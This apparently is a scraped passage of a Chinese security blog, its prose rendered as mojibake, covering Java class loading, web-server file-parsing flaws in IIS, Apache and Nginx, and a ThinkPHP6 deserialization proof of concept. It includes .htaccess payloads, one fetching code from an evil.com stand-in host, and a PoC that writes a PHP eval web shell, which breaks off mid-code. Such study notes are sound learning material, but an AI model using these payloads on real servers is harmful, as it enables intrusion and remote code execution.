class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> UserImpl();</span><br><span class="line">        <span class="comment">// user.show();</span></span><br><span class="line">        <span class="comment">//é™æ€ä»£ç†ï¼ˆå¦‚æœè¢«ä»£ç†è€…æ·»åŠ æ–¹æ³•ï¼Œproxyä¹Ÿéœ€è¦æ·»åŠ ï¼Œå¾ˆéº»çƒ¦ï¼ï¼‰</span></span><br><span class="line">        <span class="comment">// Userproxy proxy = new Userproxy(user);</span></span><br><span class="line">        <span class="comment">// proxy.show();</span></span><br><span class="line">        <span class="comment">//åŠ¨æ€ä»£ç†</span></span><br><span class="line">        <span class="comment">//è¦ä»£ç†çš„æ¥å£ï¼Œè¦åšçš„äº‹ï¼ŒcalssLader</span></span><br><span class="line">        InvocationHandler useinvocationhandler = <span class="keyword">new</span> Userinvocationhandler(user);</span><br><span class="line">        IUser proxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),useinvocationhandler);</span><br><span class="line">        proxy.a();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Userinvocationhandler.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Userinvocationhandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">(IUser user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ„ä¹‰ï¼šå°‘ä¿®æ”¹ä»£ç ï¼Œé€‚é…æ€§å¼ºã€‚</p>
<h2 id="ç±»çš„åŠ è½½"><a href="#ç±»çš„åŠ è½½" class="headerlink" title="ç±»çš„åŠ è½½"></a>ç±»çš„åŠ è½½</h2><p>é™æ€ä»£ç å—å’Œéé™æ€ä»£ç å—</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é™æ€</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">éé™æ€</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›¸åŒç‚¹ï¼šéƒ½æ˜¯JVMåŠ è½½ç±»æ—¶ä¸”åœ¨æ„é€ å‡½æ•°æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œåœ¨ç±»ä¸­éƒ½å¯ä»¥å®šä¹‰å¤šä¸ªï¼Œä¸€èˆ¬åœ¨ä»£ç å—ä¸­å¯¹ä¸€äº›staticå˜é‡è¿›è¡Œèµ‹å€¼ã€‚</p>
<p>ä¸åŒç‚¹ï¼šé™æ€ä»£ç å—åœ¨éé™æ€ä»£ç å—ä¹‹å‰æ‰§è¡Œï¼ˆé™æ€ä»£ç å— &gt; éé™æ€ä»£ç å—ï¼‰ã€‚é™æ€ä»£ç å—åªåœ¨ç¬¬ä¸€æ¬¡newæ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œä¹‹åä¸å†æ‰§è¡Œã€‚è€Œéé™æ€ä»£ç å—æ¯newä¸€æ¬¡å°±æ‰§è¡Œä¸€æ¬¡</p>
<p><strong>åŠ è½½ä¸ååºåˆ—åŒ–</strong></p>
<p>ç±»åŠ è½½çš„æ—¶å€™ä¼šæ‰§è¡Œä»£ç </p>
<p>åˆå§‹åŒ–ï¼šé™æ€ä»£ç å—</p>
<p>å®ä¾‹åŒ–ï¼šæ„é€ ä»£ç å—ï¼Œæ— å‚æ„é€ å‡½æ•°</p>
<p><strong>åŠ¨æ€ç±»åŠ è½½æ–¹æ³•</strong></p>
<p>Class.forname</p>
<p>åˆå§‹åŒ–/ä¸åˆå§‹åŒ–</p>
<p>ClassLoader.loadClassä¸è¿›è¡Œåˆå§‹åŒ–</p>
<p>åº•å±‚åŸç†ï¼Œå®ç°åŠ è½½ä»»æ„ç±»</p>
<p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
<p>loadClass-&gt;findClass(é‡å†™çš„æ–¹æ³•)-&gt;defineClass(ä»å­—èŠ‚ç åŠ è½½ç±»)</p>
<p>URLClassLoaderä»»æ„ç±»åŠ è½½ï¼šfile/http/jar</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URLClassLoader urlClassloader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:///ç±»çš„è·¯å¾„&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; c = urlClassloader.loadClass(<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure>

<p>defineClassåŒæ€åŠ è½½å­—èŠ‚ç ä»è€ŒåŠ è½½ä»»æ„ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Method m = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = (Class)m.invoke(cl,<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure>

<p>java9åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¼šå‡ºç°æŠ¥é”™ï¼Œå¯åœ¨vm optionä¸­æ·»åŠ </p>
<blockquote>
<p>é”™è¯¯ï¼šmodule java.base does not â€œopens java.langâ€ to unnamed module</p>
<p>â€“add-opens java.base/java.lang=ALL-UNNAMED</p>
</blockquote>
<p>unsafe.defineClasså­—èŠ‚ç åŠ è½½publicç±»ä¸èƒ½ç›´æ¥ç”Ÿæˆï¼ˆéœ€è¦åå°„ï¼‰ï¼ŒSpringé‡Œé¢å¯ä»¥ç›´æ¥ç”Ÿæˆ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™ä¸ªå®ä¾‹ä»…é€‚ç”¨äºJava 8ä»¥å‰çš„ç‰ˆæœ¬ã€‚Java 11å¼€å§‹Unsafeç±»å·²ç»æŠŠdefineClassæ–¹æ³•ç§»é™¤äº†ã€‚</span></span><br><span class="line">		ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">		 <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = Unsafe.class;</span><br><span class="line">        Field unsafeField = c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe = (Unsafe) unsafeField.get(<span class="keyword">null</span>);</span><br><span class="line">        Class c2 = unsafe.defineClass(<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length,cl,<span class="keyword">null</span>);</span><br><span class="line">        c2.newInstance();</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010398771/article/details/85319991">javaä¸­Unsafeä½¿ç”¨è®²è§£</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">ä¸­é—´ä»¶æ–‡ä»¶è§£ææ¼æ´</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-09</time><div class="content"><p>å½“ä¸€æ¬¡æ¬è¿å·¥</p>
<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><blockquote>
<p>åç¼€è§£æ /xx.asp;.jpg æœåŠ¡å™¨é»˜è®¤ä¸è§£æ ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­<br> ç›®å½•è§£æ /xx.asp/xx.jpg(xx.aspç›®å½•ä¸‹ä»»æ„è§£æ)<br> é»˜è®¤è§£æ xx.asa xx.cer xx.cdx<br> PROPFIND æ ˆæº¢å‡ºæ¼æ´<br> RCE CVE-2017-7269</p>
</blockquote>
<h2 id="IIS-7-0-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0-7.5 / Nginx &lt;= 0.8.37"></a>IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2><p>åœ¨Fast-CGIå¼€å¯çŠ¶æ€ä¸‹ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ååŠ ä¸Š /xx.php ï¼Œå³ xx.jpg/xx.php ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶ã€‚</p>
<h2 id="PUTæ¼æ´"><a href="#PUTæ¼æ´" class="headerlink" title="PUTæ¼æ´"></a>PUTæ¼æ´</h2><p>å¼€å¯WebDAV<br>æ‹¥æœ‰æ¥å®¾ç”¨æˆ·ï¼Œä¸”æ¥å®¾ç”¨æˆ·æ‹¥æœ‰ä¸Šä¼ æƒé™<br>å¯ä»»æ„æ–‡ä»¶ä¸Šä¼ </p>
<h2 id="Windowsç‰¹æ€§"><a href="#Windowsç‰¹æ€§" class="headerlink" title="Windowsç‰¹æ€§"></a>Windowsç‰¹æ€§</h2><p>Windowsä¸å…è®¸ç©ºæ ¼å’Œç‚¹ä»¥åŠä¸€äº›ç‰¹æ®Šå­—ç¬¦ä½œä¸ºç»“å°¾ï¼Œåˆ›å»ºè¿™æ ·çš„æ–‡ä»¶ä¼šè‡ªåŠ¨é‡å‘½åï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ xx.php[ç©ºæ ¼] ï¼Œ xx.php.ï¼Œ xx.php/ï¼Œ xx.php::$DATA ä¸Šä¼ è„šæœ¬æ–‡ä»¶ã€‚</p>
<h2 id="æ–‡ä»¶åçŒœè§£"><a href="#æ–‡ä»¶åçŒœè§£" class="headerlink" title="æ–‡ä»¶åçŒœè§£"></a>æ–‡ä»¶åçŒœè§£</h2><p>åœ¨æ”¯æŒNTFS 8.3æ–‡ä»¶æ ¼å¼æ—¶ï¼Œå¯åˆ©ç”¨çŸ­æ–‡ä»¶åçŒœè§£ç›®å½•æ–‡ä»¶ã€‚å…¶ä¸­çŸ­æ–‡ä»¶åç‰¹å¾å¦‚ä¸‹ï¼š</p>
<p>æ–‡ä»¶åä¸ºåŸæ–‡ä»¶åå‰6ä½å­—ç¬¦åŠ ä¸Š ~1 ï¼Œå…¶ä¸­æ•°å­—éƒ¨åˆ†æ˜¯é€’å¢çš„ï¼Œå¦‚æœå­˜åœ¨å‰ç¼€ç›¸åŒçš„æ–‡ä»¶ï¼Œåˆ™åé¢çš„æ•°å­—è¿›è¡Œé€’å¢ã€‚<br>åç¼€åä¸è¶…è¿‡3ä½ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«æˆªæ–­<br>æ‰€æœ‰å°å†™å­—æ¯å‡è½¬æ¢æˆå¤§å†™çš„å­—æ¯<br>æ–‡ä»¶ååç¼€é•¿åº¦å¤§äºç­‰äº4æˆ–è€…æ€»é•¿åº¦å¤§äºç­‰äº9æ—¶æ‰ä¼šç”ŸæˆçŸ­æ–‡ä»¶åï¼Œå¦‚æœåŒ…å«ç©ºæ ¼æˆ–è€…å…¶ä»–éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™æ— è§†é•¿åº¦æ¡ä»¶</p>
<p>IIS 8.0ä¹‹å‰çš„ç‰ˆæœ¬æ”¯æŒçŸ­æ–‡ä»¶åçŒœæµ‹çš„HTTPæ–¹æ³•ä¸»è¦åŒ…æ‹¬ï¼šDEBUGã€OPTIONSã€GETã€POSTã€HEADã€TRACEå…­ç§ï¼Œéœ€è¦å®‰è£…ASP.NETã€‚è€ŒIIS 8.0ä¹‹åçš„ç‰ˆæœ¬åªèƒ½é€šè¿‡OPTIONSå’ŒTRACEæ–¹æ³•çŒœæµ‹æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰ASP.NETçš„é™åˆ¶ã€‚</p>
<p>è¿™ç§æ–¹æ³•çš„å±€é™æ€§åœ¨äºï¼š</p>
<p>æ–‡ä»¶å¤¹åå‰6ä½å­—ç¬¦å¸¦ç‚¹â€.â€ï¼Œæ‰«æç¨‹åºä¼šè®¤ä¸ºæ˜¯æ–‡ä»¶è€Œä¸æ˜¯æ–‡ä»¶å¤¹ï¼Œæœ€ç»ˆå‡ºç°è¯¯æŠ¥<br>ä¸æ”¯æŒä¸­æ–‡æ–‡ä»¶å</p>
<p>è¿™ç§æ–¹æ³•å¯ä»¥é€šè¿‡å‘½ä»¤ fsutil behavior set disable8dot3 1 å…³é—­NTFS 8.3æ–‡ä»¶æ ¼å¼çš„æ”¯æŒæ¥ä¿®å¤ã€‚</p>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="åç¼€è§£æ"><a href="#åç¼€è§£æ" class="headerlink" title="åç¼€è§£æ"></a>åç¼€è§£æ</h2><p>test.php.x1.x2.x3 ï¼ˆ x1,x2,x3 ä¸ºæ²¡æœ‰åœ¨ mime.types æ–‡ä»¶ä¸­å®šä¹‰çš„æ–‡ä»¶ç±»å‹ï¼‰ã€‚Apache å°†ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œ è‹¥x3ä¸ºéå¯è¯†åˆ«åç¼€ï¼Œåˆ™åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå¯¹å¯è¯†åˆ«åç¼€è¿›è¡Œè§£æ</p>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>å½“ AllowOverride è¢«å¯ç”¨æ—¶ï¼Œä¸Šä¼ å¯ç”¨è§£æè§„åˆ™çš„.htaccess</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .gif</span><br><span class="line">FcgidWrapper <span class="string">&quot;/bin/bash&quot;</span> .gif</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include <span class="number">1</span></span><br><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span><br><span class="line"><span class="comment">#php_value auto_append_file https://evil.com/evil-code.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p>%0A ç»•è¿‡ä¸Šä¼ é»‘åå•ã€‚<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1676145">Apache HTTPDæ¢è¡Œè§£ææ¼æ´</a></p>
<h2 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure>

<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="Fast-CGIå…³é—­"><a href="#Fast-CGIå…³é—­" class="headerlink" title="Fast-CGIå…³é—­"></a>Fast-CGIå…³é—­</h2><p>åœ¨Fast-CGIå…³é—­çš„æƒ…å†µä¸‹ï¼Œ Nginx ä»ç„¶å­˜åœ¨è§£ææ¼æ´ï¼š åœ¨æ–‡ä»¶è·¯å¾„(xx.jpg)åé¢åŠ ä¸Š %00.php ï¼Œ å³ xx.jpg%00.php ä¼šè¢«å½“åš php æ–‡ä»¶æ¥è§£æ<br>å½±å“ä»¥ä¸‹ç‰ˆæœ¬</p>
<blockquote>
<p>Nginx 0.5.*<br>Nginx 0.6.*<br>Nginx 0.7 &lt;= 0.7.65<br>Nginx 0.8 &lt;= 0.8.37</p>
</blockquote>
<h2 id="Fast-CGIå¼€å¯"><a href="#Fast-CGIå¼€å¯" class="headerlink" title="Fast-CGIå¼€å¯"></a>Fast-CGIå¼€å¯</h2><p>åœ¨Fast-CGIå¼€å¯çŠ¶æ€ä¸‹ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ååŠ ä¸Š /xx.php ï¼Œåˆ™ xx.jpg/xx.php ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpçš„é…ç½®æ–‡ä»¶ php.ini æ–‡ä»¶ä¸­å¼€å¯äº† cgi.fix_pathinfo</span><br><span class="line"></span><br><span class="line">/etc/php5/fpm/pool.d/www.confä¸­ä¸æ­£ç¡®çš„é…ç½®security.limit_extensionsï¼Œå¯¼è‡´å…è®¸å°†å…¶ä»–æ ¼å¼æ–‡ä»¶ä½œä¸ºphpè§£ææ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h2><p>å½±å“nginxç‰ˆæœ¬ï¼šnginx 0.8.41 ~ 1.5.6</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®é”™è¯¯"><a href="#é…ç½®é”™è¯¯" class="headerlink" title="é…ç½®é”™è¯¯"></a>é…ç½®é”™è¯¯</h2><h3 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h3><p>å¦‚æœé…ç½®ä¸­å­˜åœ¨ç±»ä¼¼ location /foo { alias /bar/; } çš„é…ç½®æ—¶ï¼Œ/foo../ ä¼šè¢«è§£æä¸º /bar/../ ä»è€Œå¯¼è‡´ç›®å½•ç©¿è¶Šçš„å‘ç”Ÿã€‚</p>
<h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>é…ç½®ä¸­ autoindex on å¼€å¯æ—¶ï¼ŒNginxä¸­å­˜åœ¨ç›®å½•éå†æ¼æ´ã€‚</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/12444476.html">æ–‡ä»¶è§£ææ¼æ´æ€»ç»“</a><br><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/01/14/%E4%B8%AD%E9%97%B4%E4%BB%B6/">å¤§ä½¬åšå®¢</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/">thinkphp6æ¡†æ¶å­¦ä¹ &amp;ååºåˆ—åŒ–&amp;ä»»æ„å†™æ–‡ä»¶ åˆ†æ</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-09</time><div class="content"><h2 id="å¼€å‘æ‰‹å†Œ"><a href="#å¼€å‘æ‰‹å†Œ" class="headerlink" title="å¼€å‘æ‰‹å†Œ"></a>å¼€å‘æ‰‹å†Œ</h2><p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0">think6æ¡†æ¶æ‰‹å†Œ</a><br>è‹¥æƒ³æå¼€å‘çœ‹å¤§ä½¬åšå®¢<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38626043?type=blog">PHP å¼€å‘ ThinkPHP6 æ¡†æ¶å­¦ä¹  ä¸€</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38626043/article/details/121317358?spm=1001.2014.3001.5502">PHPå¼€å‘ ThinkPHP6 æ¡†æ¶å­¦ä¹  äºŒ</a></p>
<h2 id="tp6ä¸‹è½½åŠé…ç½®"><a href="#tp6ä¸‹è½½åŠé…ç½®" class="headerlink" title="tp6ä¸‹è½½åŠé…ç½®"></a>tp6ä¸‹è½½åŠé…ç½®</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Quest_sec/article/details/105340807">ç”¨phpstudyéƒ¨ç½²thinkphp6 / ä½¿ç”¨æ•™ç¨‹</a><br>åˆ©ç”¨composeä¸‹è½½<br><a target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/think">ä¸‹è½½æŒ‡ä»¤ç½‘å€</a><br>é…ç½®<br><img src="https://img-blog.csdnimg.cn/ea7a3c8d2878438fa782ded800711efd.png"><br><img src="https://img-blog.csdnimg.cn/cb1764f2dd864250a634c85d6e7ff280.png"><br>ä½¿ç”¨composerå®‰è£…tp6 phpç‰ˆæœ¬åœ¨7.1ä»¥ä¸Š</p>
<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å†™å…¥demo:<br>D:\phpstudy_pro\WWW\thinkphp6\app\controller\Index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$unser</span> = <span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">		unserialize(<span class="variable">$unser</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Filesystem</span>\<span class="title">AbstractAdapter</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;file=<span class="string">&quot;cyxhack.php&quot;</span>;  <span class="comment">//æ–‡ä»¶åç§°</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;complete=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;  <span class="comment">//å†…å®¹</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> \League\Flysystem\Adapter\Local();  <span class="comment">//has()æ–¹æ³•</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">pathPrefix</span> = &quot;./&quot;;  <span 